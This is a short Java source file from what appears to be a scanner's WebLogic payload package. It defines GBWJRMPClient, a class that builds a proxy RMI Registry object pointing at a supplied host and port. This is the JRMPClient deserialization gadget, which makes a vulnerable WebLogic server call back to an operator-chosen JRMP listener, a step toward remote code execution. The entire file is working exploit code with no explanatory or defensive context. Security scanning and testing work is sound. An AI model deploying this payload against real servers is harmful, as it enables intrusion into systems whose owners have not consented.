package com.gbw.scanner.plugins.scripts.weblogic.payload;


import com.gbw.scanner.Host;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.reflect.Proxy;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

public class GBWJRMPClient implements GBWNoEchoPayload<Registry> {

    public Registry getObject (Host host) {

        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host.getIp(), host.getPort());
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Registry proxy = (Registry) Proxy.newProxyInstance(GBWJRMPClient.class.getClassLoader(), new Class[] {
            Registry.class
        }, obj);
        return proxy;
    }


    @Override
    public String getName() {
        return "GBWJRMPClient";
    }
}
